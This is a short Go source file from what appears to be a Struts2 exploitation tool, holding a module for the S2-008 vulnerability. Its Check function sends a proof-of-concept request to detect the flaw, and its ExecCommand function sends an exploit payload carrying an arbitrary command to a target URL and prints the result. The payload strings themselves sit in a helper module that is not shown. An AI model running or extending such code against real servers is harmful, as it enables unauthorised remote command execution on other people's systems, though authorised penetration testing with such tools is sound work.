package s008

import (
	"ST2G/cvemod/utils"
	"fmt"
	"github.com/fatih/color"
)

func Check(targetUrl string){
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s008_check)
	if utils.IfContainsStr(respString,utils.Checkflag){
		color.Red("*Found Struts2-008！")
	}else {
		fmt.Println("Struts2-008 Not Vulnerable.")
	}
}
func ExecCommand(targetUrl string,command string) {
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s008_exec(command))
	fmt.Println(respString)
}